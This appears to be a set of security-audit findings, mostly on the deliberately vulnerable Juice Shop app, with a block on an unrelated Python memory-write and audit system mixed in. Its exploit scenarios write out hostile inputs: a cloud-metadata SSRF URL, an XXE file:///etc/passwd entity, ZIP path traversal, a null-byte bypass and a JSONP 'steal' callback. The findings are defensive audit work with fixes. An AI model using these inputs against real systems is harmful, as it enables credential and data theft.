This means any cross-origin script can make credentialed or non-credentialed requests to the API and read the responses.
exploit_scenario: 1. Victim is logged into Juice Shop (has a valid JWT cookie or Authorization header). 2. Victim visits attacker's webpage. 3. Attacker's page uses fetch() to call https://juice-shop/rest/user/whoami and reads the JSON response including the user's email and account details because CORS returns *. 4. With a stolen JWT the attacker can place orders, export data, etc.
framework_protection: CORS origin should be restricted to the application's own domain. Use: cors({ origin: process.env.ALLOWED_ORIGIN ?? 'https://your-domain.com', credentials: true }). Wildcards are incompatible with credentials: true and expose all API data to arbitrary origins.
fix_recommendation: Replace app.use(cors()) with app.use(cors({ origin: config.get('server.baseUrl'), credentials: true })). Remove the comment that normalizes this as acceptable.

question: Q3
title: Content-Security-Policy absent at application level; only set on user profile page with 'unsafe-eval'
exact_code:
const CSP = `img-src 'self' ${user?.profileImage}; script-src 'self' 'unsafe-eval'`
...
res.set({ 'Content-Security-Policy': CSP })
data_flow: helmet is imported in server.ts but only helmet.noSniff() and helmet.frameguard() are called. helmet.contentSecurityPolicy() is never invoked globally. The only CSP header set is on the /profile route, and it includes 'unsafe-eval' in script-src (allowing eval/Function() calls) and interpolates the user-controlled profileImage URL directly into the policy header, which can be abused to inject additional CSP directives. The xssFilter middleware is commented out at line 187.
exploit_scenario: 1. Most routes (all /api/* and /rest/* endpoints) return responses with no CSP header. 2. If an XSS payload is stored (e.g., via product review), the browser executes it freely because no CSP blocks inline scripts on those pages. 3. On the profile page, an attacker sets profileImage to a URL containing a semicolon followed by additional policy directives (e.g., script-src *) to weaken or bypass the partial CSP.
framework_protection: A strict Content-Security-Policy should be applied globally via helmet.contentSecurityPolicy() with specific directives. 'unsafe-eval' and 'unsafe-inline' should be avoided. The profile image URL must be validated and sanitized before interpolation into a header value.
fix_recommendation: Add globally: app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"], imgSrc: ["'self'", 'data:'], styleSrc: ["'self'", "'unsafe-inline'"] } })). Remove unsafe-eval from the profile CSP and validate profileImage against an allowlist before interpolating.

question: Q4
title: Directory listing enabled for /ftp, /encryptionkeys, /.well-known, and /support/logs
exact_code:
app.use('/ftp', serveIndexMiddleware, serveIndex('ftp', { icons: true }))
app.use('/ftp(?!/quarantine)/:file', servePublicFiles())
app.use('/.well-known', serveIndexMiddleware, serveIndex('.well-known', { icons: true, view: 'details' }))
app.use('/encryptionkeys', serveIndexMiddleware, serveIndex('encryptionkeys', { icons: true, view: 'details' }))
app.use('/encryptionkeys/:file', serveKeyFiles())
app.use('/support/logs', serveIndexMiddleware, serveIndex('logs', { icons: true, view: 'details' }))
app.use('/support/logs/:file', serveLogFiles())
data_flow: serve-index renders a browsable HTML directory listing. /ftp exposes arbitrary downloadable files. /encryptionkeys exposes JWT keys and other cryptographic material. /support/logs exposes rotating access logs (containing IP addresses, endpoints, cookies, and user-agent strings from all users). All four paths have no authentication middleware applied before serveIndex.
exploit_scenario: 1. Unauthenticated GET to /encryptionkeys — attacker sees and downloads jwt.pub and potentially other key files. Combined with the hardcoded private key (MISCONFIG-003) this enables full JWT forgery. 2. Unauthenticated GET to /support/logs — attacker downloads timestamped access logs revealing all IP addresses, session tokens in query strings, and endpoint usage patterns. 3. Unauthenticated GET to /ftp — attacker browses and downloads backup files, configuration exports, or other sensitive documents stored there.
framework_protection: Directory listings must be disabled for production. Sensitive directories should require authentication middleware. Cryptographic key files must not be served over HTTP under any circumstances.
fix_recommendation: Remove serveIndex middleware from /encryptionkeys and /support/logs entirely. For /ftp, require authentication before listing. For /encryptionkeys, serve only the public key and only to authenticated admin users: app.use('/encryptionkeys', security.isAuthorized(), security.isAdmin()). Delete serveIndex from that route.

question: Q5
title: Prometheus /metrics endpoint publicly accessible without authentication
exact_code: app.get('/metrics', metrics.serveMetrics()) // vuln-code-snippet vuln-line exposedMetricsChallenge
data_flow: metrics.serveMetrics() (routes/metrics.ts line 884) calls register.metrics() from prom-client and sends the full Prometheus scrape payload. This includes: application version (exact semver), number of registered users, wallet balances, order counts, challenge solve status, cheat scores, and HTTP request rates by status code. No isAuthorized() middleware is applied. The comment 'vuln-line exposedMetricsChallenge' confirms this is intentional for the challenge but it is a real misconfiguration in any production context.
exploit_scenario: 1. Unauthenticated GET to /metrics returns hundreds of lines of Prometheus metrics. 2. Attacker reads juice-shop_version_info to identify the exact application version for CVE matching. 3. Attacker reads user registration counts and wallet balances to understand the scale and value of accounts. 4. HTTP request rate metrics reveal endpoint usage patterns for targeted attack planning.
framework_protection: Metrics endpoints must be protected by network-level controls (only accessible from internal scrape IPs) or require authentication. In Express: app.get('/metrics', ipWhitelist(['10.0.0.0/8']), metrics.serveMetrics()) or require a Bearer token.
fix_recommendation: Add authentication or IP filtering: app.get('/metrics', security.isAuthorized(), metrics.serveMetrics()). Alternatively restrict the /metrics route to localhost or a private subnet via a reverse-proxy rule.

question: Q5
title: Full application configuration exposed via unauthenticated REST endpoint
data_flow: The route GET /rest/admin/application-configuration (server.ts line 605) calls retrieveAppConfiguration() which returns the entire node-config 'config' object as JSON. This object contains: application name and domain, server base URL, challenge parameters, feature flags, product definitions, and potentially any environment-overlaid secrets. There is no isAuthorized() or isAdmin() middleware applied to this route. Despite the '/admin/' path prefix, the route is fully public.
exploit_scenario: 1. Unauthenticated GET to /rest/admin/application-configuration returns a large JSON blob. 2. Attacker reads challenge configurations, internal domain names, base URLs, and any keys stored in config files. 3. The configuration reveals which challenges are enabled, their expected key values, and internal routing information, enabling targeted attack planning.
framework_protection: Admin endpoints must require authentication and admin-level authorization. The /admin/ path prefix provides no security by itself — it requires explicit middleware.
fix_recommendation: Add authorization: app.get('/rest/admin/application-configuration', security.isAuthorized(), security.isAdmin(), retrieveAppConfiguration()). Consider returning only non-sensitive configuration subsets rather than the full config object.

question: Q1
title: SSRF via user-controlled chatbot training data URL
data_flow: config 'application.chatBot.trainingData' -> isUrl() check -> download(trainingFile) -> fs.writeFile. If the config value is attacker-controlled via environment variable injection or config file tampering, the server fetches an arbitrary URL server-side and writes the response body to disk.
exploit_scenario: Attacker controls the chatBot.trainingData config (e.g., env var override in a misconfigured deployment). They set it to 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'. The `download` npm package fetches it server-side, the response is written to 'data/chatbot/<filename>', then parsed via JSON.parse — leaking cloud metadata credentials or internal service responses.
framework_protection: None. utils.isUrl() only gates whether to download; it does not restrict URL scheme or target host. No allowlist of safe domains is enforced.
fix_recommendation: Validate the URL against a strict allowlist of trusted hostnames. Block RFC-1918, loopback, link-local, and cloud metadata IP ranges. Use a sandboxed HTTP client with SSRF mitigations (e.g., ssrf-req-filter npm package). Prefer bundling training data statically rather than fetching at runtime.

question: Q3
title: XXE with SSRF potential via user-uploaded XML parsed with noent:true
data_flow: Uploaded .xml file buffer -> toString() -> libxmljs2.parseXml() with noent:true. The noent flag enables XML external entity expansion. User controls the full XML document including DOCTYPE and entity declarations.
exploit_scenario: Attacker uploads XML containing an external entity declaration referencing 'file:///etc/passwd' or an internal network URL such as 'http://internal-service:8080/admin'. The noent:true flag causes libxmljs2 to resolve the entity and embed the target content. The parsed document content is reflected in the error response, disclosing the data. The vm wrapper does not prevent this since XXE resolution occurs inside the libxml C library, below the JS sandbox layer.
framework_protection: The vm timeout limits DoS-style attacks. The challengeUtils.solveIf calls confirm this is intentional, but the XXE is fully exploitable against real infrastructure. No scheme or host restrictions are applied to entity URLs.
fix_recommendation: Disable external entity expansion: remove 'noent: true' or add 'nonet: true' to block network entities. Consider switching to a JS-native parser (xml2js) with entity expansion disabled. Never reflect parsed user-supplied XML content in error messages.

question: Q2
title: Unsafe YAML deserialization via yaml.load on user-uploaded file content
data_flow: Uploaded .yml/.yaml file -> buffer.toString() -> yaml.load(data) inside vm context. js-yaml yaml.load() with the default FULL_SCHEMA can instantiate arbitrary JS objects via YAML type tags or enable prototype pollution via crafted keys.
exploit_scenario: In js-yaml versions supporting FULL_SCHEMA, uploading a YAML file with a !!js/function tag causes function evaluation during deserialization — leading to arbitrary code execution. In js-yaml 4.x, prototype pollution via crafted YAML object keys (e.g., __proto__ mapped to {admin: true}) can corrupt the prototype chain if downstream code merges the parsed object without hasOwnProperty guards. YAML bomb payloads trigger the DoS path.
framework_protection: The vm timeout catches YAML bombs. Neither the vm context nor the timeout prevents synchronous code execution from !!js/function evaluation or prototype pollution side effects.
fix_recommendation: Use yaml.load() with a restricted schema option: { schema: yaml.FAILSAFE_SCHEMA } or { schema: yaml.JSON_SCHEMA }. Upgrade to js-yaml 4.x minimum. Sanitize parsed object keys before any merge operations to reject prototype-polluting property names.

question: Q6
title: Path traversal in ZIP upload extraction enables arbitrary file write
data_flow: Uploaded ZIP file -> unzipper.Parse() -> entry.path (attacker-controlled zip entry name) -> path.resolve() for guard check -> fs.createWriteStream('uploads/complaints/' + fileName) for actual write. The entry path from the ZIP archive header is used directly in path concatenation without normalization.
exploit_scenario: A ZIP with entry named '../../ftp/legal.md' — path.resolve('uploads/complaints/../../ftp/legal.md') resolves to cwd/ftp/legal.md, which contains path.resolve('.') (the cwd), passing the guard. The WriteStream is opened at 'uploads/complaints/../../ftp/legal.md', overwriting ftp/legal.md outside the intended directory. With deeper traversal any file writable by the Node process can be overwritten — enabling persistent code injection. The fileWriteChallenge confirms this traversal works in practice.
framework_protection: The absolutePath.includes(path.resolve('.')) check is bypassable: any traversal that stays within the cwd passes. The check prevents absolute-path escapes (e.g., /etc/passwd) but does not prevent relative traversal within the working directory tree.
fix_recommendation: Normalize with path.basename(entry.path) to strip all directory components, or validate strictly: ensure path.resolve('uploads/complaints/', safeFileName).startsWith(path.resolve('uploads/complaints') + path.sep) before opening WriteStream. Never concatenate zip entry paths directly into filesystem paths.

title: Content firewall scans raw payload fields, not the validated Pydantic model — TOCTOU on field selection
finding: In validate_memory_write(), the content firewall (Gate 1.5) is called with the raw `payload` dict and a hardcoded field list `['summary', 'justification']`. However, Gate 1 (Pydantic schema parsing) has already transformed `payload` into a MemoryWriteRequest. The firewall therefore scans the pre-validated raw strings, which is correct for those two fields. But if Pydantic coerces or transforms the summary/justification values (e.g., strips trailing whitespace or applies a validator), the firewall scans the *pre-coercion* string while the *post-coercion* string is stored. Additionally, the firewall only scans exactly two fields (`summary` and `justification`). The `provenance.session_id`, `provenance.decision_trace_id`, `references[]`, and `tags[]` fields are not firewall-scanned — only the forbidden-key scan (Gate 2) covers them, which checks key names, not field *values*. An attacker can embed raw context or high-entropy encoded content in `session_id`, `decision_trace_id`, or any `tags[]` entry and bypass the content firewall entirely.
exact_lines:
firewall_result = scan_content(payload, fields=['summary', 'justification'])
if not firewall_result.clean:
exploit_scenario: Attacker sends: `{"summary": "OK", "justification": "OK", "provenance": {"session_id": "<base64-encoded transcript>", ...}, "tags": ["<raw context blob>"]}`. The content firewall passes (only checks summary/justification). The forbidden-key scan passes (key names are fine). Pydantic validates. The raw context is persisted via the repository.

title: M52MemoryRepository.create_memory() does NOT call _validate_metadata_at_boundary() — v1 Q-1 issue persists
finding: In v1 (qdrant.py), upsert() never called _validate_metadata_at_boundary(). In v2, M52MemoryRepository.create_memory() also has no equivalent boundary re-validation call. The repository trusts that the caller (route handler) has already run validate_memory_write(). However, memory_write_internal() (the internal write path used by webhooks and other callers) also calls repo.create_memory() directly after only checking idempotency — it does NOT call validate_memory_write(). This means any internal caller that uses memory_write_internal() with a pre-built MemoryWriteRequest that was NOT produced by validate_memory_write() (e.g., constructed programmatically) bypasses all enforcement gates at the repository boundary.
exact_lines:
async def memory_write_internal(
    request: EnforcementWriteRequest,
    db: aiosqlite.Connection,
) -> MemoryWriteResponse:
    """
    Internal memory write function.
    Used by both the API endpoint and webhook ingestion.
    Bypasses raw payload parsing - expects pre-validated MemoryWriteRequest.
    """
    ...
    repo = M52MemoryRepository(db)
    is_duplicate, existing_response = await repo.check_idempotency(request)
    ...
    response = await repo.create_memory(request)
exploit_scenario: An internal webhook or trusted caller (or future code path) calls memory_write_internal() with a manually constructed MemoryWriteRequest containing forbidden content or invalid provenance. The content firewall, forbidden-key scan, and all other enforcement gates are bypassed. The content is persisted directly.

title: create_memory() does not call audit/receipts system — no write receipt issued
finding: M52MemoryRepository.create_memory() performs the INSERT and commit, then returns a MemoryWriteResponse directly. There is no call to any receipt or audit system from the repository layer. The write path in the route handler also does not call emit_audit() after storage succeeds. The only audit emission in the maintenance path is from admit_maintenance_operation(), which calls _emit_maintenance_audit() → emit_audit() from the pipeline. For normal write operations, no audit entry is produced. Only telemetry counters (emit_write_accepted) are called, which are non-audit-grade counters. The LC-2 issue (receipt before write) is implicitly avoided here since there is no receipt at all, but LC-8 (receipt chain ephemeral/missing) from v1 is not improved — v2 simply has no receipt chain for writes.
exact_lines:
await self.db.execute(
    """
    INSERT INTO m52_memories (
        id, class_toggle, summary, justification,
        ...
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """,
    (...)
)
await self.db.commit()

return MemoryWriteResponse(
    write_id=request.id,
    status="success",
    stored_at=stored_at,
    class_toggle=request.class_toggle,
    revision=revision,
)
exploit_scenario: A successful write produces no audit trail entry. If the telemetry service (emit_write_accepted) is down or fails silently, there is no other record that the write occurred beyond the database row itself. This eliminates the ability to replay or audit the write admission chain.

title: admit_maintenance_operation() does NOT catch S3MaintenanceHalt — it propagates out of the pipeline uncaught by the pipeline's own except block
finding: The admit_maintenance_operation() function has a try/except that catches MaintenanceAdmissionError (an Exception subclass) and converts it to MaintenanceAdmissionViolation. However, S3MaintenanceHalt is a BaseException subclass, NOT an Exception. The pipeline's except block (`except MaintenanceAdmissionError`) does NOT catch S3MaintenanceHalt. If S3MaintenanceHalt is raised during step1_authority_validation() (which can happen if authority.__post_init__ raises it again, or if the double-check in step1 fires), it propagates out of admit_maintenance_operation() completely — bypassing the rejection audit emission block. This means a forbidden authority type that reaches the pipeline step1 check produces an S3MaintenanceHalt with NO rejection audit entry emitted. The audit trail is silent for this failure mode.
exploit_scenario: An authority type that is in FORBIDDEN_MAINTENANCE_AUTHORITY_TYPES reaches step1_authority_validation (this is the double-check, since __post_init__ would have already blocked it). The S3MaintenanceHalt propagates out of admit_maintenance_operation without emitting a MAINTENANCE_REJECTED audit entry. The halt itself is correct, but the audit gap means compliance tooling that relies on MAINTENANCE_REJECTED events for all failures will miss S3-severity rejections.

title: emit_audit() in audit_sink.py does NOT swallow exceptions — but callers in tiering.py call it with no error handling, swallowing emission failures
finding: AppendOnlyAuditSink.emit() itself raises AuditMutationError if sealed, and propagates any internal exception. It does NOT silently swallow errors. However, TieringService.transition_tier() calls emit_audit() unconditionally after the DB commit, with no try/except around the emit_audit() call. If emit_audit() raises (e.g., if the sink is sealed, or an internal threading error), the exception propagates out of transition_tier() and is caught by the bulk_transition() loop's `except Exception as exc: logger.error(...)` — which logs and continues. This means a tier transition can succeed in the database but have its audit record silently dropped (logged as an error but not surfaced to the caller). The operation is committed with no audit record.
exact_lines:
await self.db.commit()
affected = cursor.rowcount > 0

if affected:
    logger.info(...)
    emit_audit(
        run_id=f"tier-{uuid4().hex[:12]}",
        event_type=AuditEventType.MAINTENANCE_ADMITTED,
        ...
    )

return affected
exploit_scenario: The audit sink for a run is sealed (e.g., by a concurrent process or a race condition during shutdown). transition_tier() commits the DB change and then calls emit_audit(), which raises AuditMutationError. The error is caught by bulk_transition()'s generic except block. The tier transition is committed with no audit record. The AUDIT_SINK_CONTRACT clause 8 ('Emit happens synchronously, before side-effects') is violated because the emit happens AFTER the commit.

title: Audit emit in tiering.py happens AFTER db.commit() — violates audit-before-side-effect invariant
finding: The AUDIT_SINK_CONTRACT states: 'NO BUFFERING: Emit happens synchronously, before side-effects. Delayed emission is an S3 violation.' In TieringService.transition_tier(), the sequence is: (1) UPDATE query, (2) await self.db.commit(), (3) emit_audit(). The database mutation is committed BEFORE the audit record is emitted. If the process crashes, is killed, or encounters a network partition between step 2 and step 3, the tier transition is durable in the database but the audit record is permanently lost. This is a direct violation of the contract's own stated invariant.
exact_lines:
await self.db.commit()
affected = cursor.rowcount > 0

if affected:
    emit_audit(
        run_id=f"tier-{uuid4().hex[:12]}",
        event_type=AuditEventType.MAINTENANCE_ADMITTED,
        layer=AuditLayer.PROCEDURAL,
        payload={...},
    )
exploit_scenario: Process crash or SIGKILL between commit() and emit_audit(). The database reflects a tier transition but the audit sink has no record. Compliance replay using only audit records will fail to account for this transition. Conversely, since the audit sink is in-memory (AppendOnlyAuditSink._entries is a list), and the DB is durable, the audit record would always be at risk of loss on restart regardless of ordering.

title: Write path admission receipt is NOT linked to the storage write — independent ledger problem persists
finding: In v1, LC-2 was that the receipt was created BEFORE the storage write (no atomicity). In v2, the problem is inverted but structurally identical: there is no receipt system at all for writes. The sequence in memory_write() is: (1) validate_memory_write() [enforcement gates], (2) repo.check_idempotency(), (3) repo.create_memory() [DB INSERT + commit], (4) emit_write_accepted() [telemetry counter]. The telemetry call (4) is a counter increment, not an audit-grade record. There is no M9.7 audit entry created for write operations (only for maintenance operations). The WRITE_PROPOSED, WRITE_ADMITTED, WRITE_REJECTED event types exist in the AuditEventType enum but are never called from the write path. The enforcement gates produce no durable artifact linking them to the specific storage write.
exact_lines:
# These event types exist but are never emitted from the write path:
WRITE_PROPOSED = "write.proposed"
WRITE_ADMITTED = "write.admitted"
WRITE_REJECTED = "write.rejected"
exploit_scenario: An attacker can write a memory item and the audit trail will show no WRITE_ADMITTED event (because none is emitted). If a compliance audit queries the audit log for all writes, the result is empty — even though writes are occurring. The audit log is only populated for maintenance operations.

question: Q4
title: Null Byte Injection Bypasses File Extension Allowlist in Public File Server
data_flow: Request arrives with file = 'package.json.bak%00.md'. endsWithAllowlistedFileType passes because the raw string ends with '.md'. Then cutOffPoisonNullByte strips from %00 onward, leaving 'package.json.bak'. res.sendFile serves the .bak file — a non-allowlisted type.
exploit_scenario: Attacker requests GET /ftp/package.json.bak%2500.md (double URL-encoded null byte). Express decodes %25 to %, leaving %00.md, which passes the .md check. After null byte trimming, the server serves package.json.bak, revealing internal npm package metadata and dependency versions useful for supply chain attacks.
framework_protection: cutOffPoisonNullByte exists but is applied after the allowlist check, not before. The fix requires running the null byte strip first, then checking the extension on the clean filename.
fix_recommendation: Sanitize the filename before the allowlist check: apply cutOffPoisonNullByte(file) first, then check endsWithAllowlistedFileType on the result. Reject the request if the cleaned name differs from the original in a way that changes the extension.

question: Q6
title: Order History Endpoint Returns Data Without Authentication or User Scoping
exact_code: app.get('/rest/order-history', orderHistory())
data_flow: GET /rest/order-history is registered with no security.isAuthorized() middleware. The orderHistory() handler (routes/orderHistory.ts) queries order records. No JWT is required to call this endpoint.
exploit_scenario: Unauthenticated attacker sends GET /rest/order-history and receives order history records. Depending on the handler's internal filtering logic, this may expose customer email hashes, product lists, pricing, and delivery addresses without any login required.
framework_protection: Contrast with /rest/order-history/orders (all orders, admin) which correctly requires security.isAccounting(). The base /rest/order-history endpoint has no equivalent guard.
fix_recommendation: Add security.isAuthorized() before orderHistory(): app.get('/rest/order-history', security.isAuthorized(), orderHistory()). Additionally verify the handler filters results to the authenticated user's own orders.

question: Q5
title: Security Answer HMAC Uses Hardcoded Key
exact_code: export const hmac = (data: string) => crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj').update(data).digest('hex')
data_flow: Security answers are stored in the SecurityAnswers table as HMAC-SHA256 with the hardcoded key 'pa4qacea4VK9t9nGv7yZtwmj'. The hmac() function is called from models/securityAnswer.ts set() hook and compared in routes/resetPassword.ts.
exploit_scenario: The HMAC key is hardcoded and committed to source. An attacker with DB access and knowledge of the key (from source code) can precompute HMAC values for common security answers offline. Unlike bcrypt, HMAC-SHA256 is fast to compute — a GPU can compute billions per second. Combined with the low entropy of security question answers, this allows rapid offline cracking.
framework_protection: none
fix_recommendation: Store security answers hashed with bcrypt or argon2 (not HMAC). Load any keying material from environment variables, never hardcode. Consider making security answers case-insensitive before hashing to reduce brute-force surface while maintaining usability.

question: Q6
title: 2FA Verification Rate Limit Too Permissive (100 req/5min) and Uses Insecure Key
exact_code:
app.post('/rest/2fa/verify',
    rateLimit({ windowMs: 5 * 60 * 1000, max: 100, validate: false }),
    twoFactorAuth.verify
  )
data_flow: POST /rest/2fa/verify accepts tmpToken (a short-lived JWT for the intermediate state) and totpToken (6-digit TOTP code). Rate limit is 100 requests per 5-minute window. The tmpToken itself expires via JWT expiry (6h from authorize()). TOTP window is set to 1 (accepts tokens 30s old or new).
exploit_scenario: A TOTP token is 6 digits (1,000,000 possibilities). At 100 requests per 5 minutes, an attacker gets 100 guesses per window. With a 30-second TOTP window and a 30-second token validity period, the attack space is limited — but 100 guesses per 5 minutes is still far too generous. The tmpToken also has a 6-hour expiry (inherited from authorize()), giving a very large window. The `validate: false` flag suppresses rate-limiter health warnings, possibly hiding misconfiguration.
framework_protection: partial
fix_recommendation: Reduce rate limit to 3-5 attempts per 5 minutes for 2FA verification. Reduce tmpToken expiry to 2-3 minutes (issue a purpose-specific short-lived token). Remove `validate: false` to surface any configuration warnings. Consider invalidating the tmpToken after a single failed 2FA attempt.

question: Q1
title: No Account Lockout on Password Change or 2FA Setup Endpoints
data_flow: GET /rest/user/change-password allows repeated password guesses against currentPassword with no rate limiting applied in server.ts. Similarly, POST /rest/2fa/setup verifies the user's password without rate limiting. An authenticated attacker with a valid session token (e.g., stolen session) can iterate passwords.
exploit_scenario: An authenticated attacker (e.g., with a leaked session token for a low-privilege account) can brute-force the current password via the change-password endpoint to escalate — particularly if they want to change the password and lock out the legitimate user.
framework_protection: none
fix_recommendation: Apply rate limiting to /rest/user/change-password and /rest/2fa/setup. Require re-authentication (e.g., short-lived sudo token) for sensitive account changes.

question: Q5
title: Security Question Enumeration — Email Existence Oracle
data_flow: GET /rest/user/security-question?email=X returns the security question for a registered email, and returns an empty object for unknown emails. No authentication required. No rate limiting applied on this endpoint in server.ts.
exploit_scenario: An attacker can enumerate valid email addresses by calling this endpoint: a non-empty response with a question field confirms the email is registered. This enables targeted phishing and credential-stuffing attacks against known accounts. Combined with the reset-password brute-force vulnerability, it provides a complete account takeover chain.
framework_protection: none
fix_recommendation: Return the same response structure regardless of whether the email is found (a randomly selected or fixed security question, or just a 200 OK with no data). Apply rate limiting. Require a CAPTCHA for password reset initiation.

question: Q4
title: JSONP Callback Enables Token/Email Leak via currentUser Endpoint
data_flow: GET /rest/user/whoami supports a ?callback= query parameter enabling JSONP. When callback is specified, Express's res.jsonp() wraps the response (which includes the user's id, email, lastLoginIp, profileImage) in the callback function. The challenge name emailLeakChallenge confirms this is intentional.
exploit_scenario: A malicious third-party website can include a <script src='https://juice-shop/rest/user/whoami?callback=steal'> tag. When a logged-in Juice Shop user visits the attacker's site, their browser sends the auth cookie to the Juice Shop server, and the JSONP response calls steal({user: {email: ..., id: ...}}) — leaking the user's identity to the attacker.
framework_protection: none
fix_recommendation: Remove the JSONP callback support entirely. Use CORS with explicit origin allowlists instead. If JSONP must be supported for legacy reasons, validate the callback function name against a strict alphanumeric allowlist and restrict the data returned.

question: Q2,Q5
title: helmet 4.6.0 - Two Major Versions Behind, Missing Modern Isolation Headers (Current: 8.x)
data_flow: helmet middleware sets HTTP security headers on all responses → browser enforces Content-Security-Policy, X-Frame-Options, and other headers → older helmet omits headers added in v5 through v8
exploit_scenario: helmet 4.x does not include Cross-Origin-Opener-Policy (COOP), Cross-Origin-Embedder-Policy (COEP), or Cross-Origin-Resource-Policy (CORP) headers added in helmet 5+. Missing COOP allows cross-origin window handle access, enabling XS-Leaks side-channel attacks. helmet 4 also does not set Content-Security-Policy by default (opt-in only), meaning that if the application does not explicitly configure CSP, there is no browser-level XSS mitigation.
framework_protection: helmet 4.x still sets X-XSS-Protection, X-Content-Type-Options, and X-Frame-Options. Core protections are present but modern isolation headers are absent.
fix_recommendation: Upgrade to helmet ^8.0.0. Enable and configure CSP explicitly with a strict policy. Run integration tests to verify new header defaults do not break existing functionality.

question: Q1,Q2
title: socket.io 3.1.2 - Outdated, engine.io DoS CVE Present (Current: 4.x)
exact_code: "socket.io": "^3.1.2"
data_flow: socket.io handles WebSocket connections for chat and notification features → attacker controls WebSocket handshake and message payloads → underlying engine.io parsing can be targeted for DoS
exploit_scenario: socket.io 3.x is based on engine.io 4.x which contains CVE-2022-21676: Denial of Service via crafted WebSocket handshake data. An attacker sends malformed WebSocket frames that trigger resource exhaustion in engine.io parsing, causing server crashes or excessive memory/CPU consumption that takes the application offline. socket.io 4.x (current) resolved multiple issues in engine.io and the adapter layer. The devDependency socket.io-client is also at 3.1.3, matching the outdated server version.
framework_protection: socket.io 3.x has some input validation, but the DoS in underlying engine.io affects all 3.x versions prior to patched releases.
fix_recommendation: Upgrade to socket.io ^4.8.0. Update socket.io-client from ^3.1.3 to ^4.8.0 to maintain version compatibility.

question: Q2,Q5
title: node-pre-gyp 0.15.0 in Production Dependencies - Deprecated Unmaintained Package
exact_code: "node-pre-gyp": "^0.15.0"
data_flow: node-pre-gyp downloads pre-built native binaries during npm install → fetches from remote URLs using vulnerable node-fetch → placed in production dependencies unnecessarily, expanding production attack surface
exploit_scenario: The original node-pre-gyp package is deprecated and unmaintained — the project was forked to @mapbox/node-pre-gyp. Version 0.15.0 uses node-fetch 2.x with CVE-2022-0235 (open redirect). In build environments, a man-in-the-middle on the binary download URL or a compromised package registry could redirect binary downloads to attacker-controlled binaries. Additionally, the package is in production dependencies rather than devDependencies, meaning it is present in production containers where it serves no purpose.
framework_protection: npm install integrity checks (with lockfile SRI hashes) provide partial mitigation for supply chain attacks on binary downloads.
fix_recommendation: Replace with @mapbox/node-pre-gyp (the maintained fork). Move to devDependencies since it is only needed at build time for native module compilation. Ensure package-lock.json is committed and npm ci is used in production builds.

question: Q4
title: Build Tools in Production Dependencies: grunt, ts-node-dev Inflate Attack Surface
exact_code:
"grunt": "^1.6.1",
"ts-node-dev": "^1.1.8",
"replace": "^1.2.2",
"grunt-contrib-compress": "^1.6.0",
"grunt-replace-json": "^0.1.0"
data_flow: Standard npm install (without --omit=dev flag) installs grunt, ts-node-dev, replace, and grunt plugins as production dependencies → production container surface area expanded → TypeScript compilation and task automation tools active in production environment
exploit_scenario: grunt, ts-node-dev, replace, grunt-contrib-compress, and grunt-replace-json are development and build tools with no legitimate production runtime purpose. Their presence in production: ts-node-dev enables live TypeScript compilation — if upload paths are misconfigured, injected TypeScript files could be compiled and executed at runtime; grunt's plugin loading system can be abused if Gruntfile.js is writable; the replace utility performs file content substitution that could be misused. The package:ci script calls npm prune --production, but standard Docker builds using plain npm install do not prune.
framework_protection: The package:ci script does call npm prune --production, mitigating this when the CI packaging path is used. Risk is conditional on Docker build methodology.
fix_recommendation: Move grunt, ts-node-dev, replace, grunt-contrib-compress, and grunt-replace-json to devDependencies. Verify all production Docker builds use npm ci --omit=dev or explicitly call npm prune --production.

question: Q2,Q5
title: multer 1.4.5-lts.1 - End-of-Life 1.x Branch, Superseded by 2.x with Security Fixes
data_flow: multer handles multipart/form-data file uploads → parses MIME boundaries and file content → stores temporary files on disk → application processes uploaded files from challenge endpoints
exploit_scenario: multer 1.4.5-lts.1 is an LTS security backport indicating the 1.x branch has reached end-of-life. multer 2.x (current) includes fixes for potential ReDoS in boundary parsing, improved file type validation, and fixes for multipart header injection issues. The range ^1.4.5-lts.1 will never resolve to 2.x. Crafted malformed multipart requests targeting 1.x boundary parsing bugs can trigger denial of service or potentially bypass file type checks.
framework_protection: Juice Shop applies separate file-type checking using the file-type package, providing partial mitigation against content-type spoofing attacks.
fix_recommendation: Upgrade to multer ^2.0.0. Test all upload endpoints after upgrade for breaking API changes in file handling callback signatures.

question: Q6
title: Caret Version Ranges on Security-Critical Dependencies Allow Silent Vulnerable Version Pulls
data_flow: npm install resolves caret ranges to latest compatible minor and patch versions → without an enforced lockfile via npm ci, fresh clones can pull unpinned versions → supply chain or regression vulnerabilities enter silently without any manifest change
exploit_scenario: The caret (^) range allows any minor and patch update within the same major version. Without a committed package-lock.json enforced via npm ci in all build contexts, a fresh npm install months from now could pull a newly vulnerable patch version. pug has a history of SSTI vulnerabilities and caret ranges do not prevent pulling newly introduced issues in pug 3.x. sequelize ^6.37.3 allows pulling any 6.x version including potential future regressions. This supply-chain hygiene issue compounds all other component vulnerabilities.
framework_protection: If package-lock.json is committed and npm ci is used in all builds, this is mitigated for installs from the existing lockfile. However npm install (not npm ci) still resolves ranges dynamically and can produce different results.
fix_recommendation: Commit package-lock.json to version control. Use npm ci in all CI/CD pipelines and Docker builds instead of npm install. Consider pinning critical security dependencies (jsonwebtoken, express-jwt, sequelize) to exact versions.

question: Q4
title: Math.random() Used for User Password Generation in Fake User Seeding
data_flow: makeRandomString(5) using Math.random() → 5-character plaintext password → passed to UserModel.create() → MD5 hashed and stored. Fake user accounts are seeded with predictable 5-character passwords (62^5 = ~916 million combinations, but Math.random() makes them predictable).
exploit_scenario: 1. Attacker obtains the seeded fake user email addresses from the database. 2. Using knowledge of V8's Math.random() PRNG state and seeding time, attacker narrows the password space. 3. Even without PRNG prediction, 5-character alphanumeric passwords combined with broken MD5 hashing allow trivial brute-force of these accounts.
framework_protection: None. Math.random() is seeded from system entropy but its output is not suitable for security-sensitive generation.
fix_recommendation: Use `crypto.randomBytes()` for any security-relevant random generation. Increase minimum password length to ≥16 characters for seeded accounts, or use UUIDs.

question: Q3
title: TOTP Secrets Stored in Plaintext in Database Column
data_flow: otplib.authenticator.generateSecret() → setupToken JWT payload → decoded in routes/2fa.ts setup() → userModel.totpSecret = secret → saved as plaintext STRING in the Users table via Sequelize. No encryption at rest.
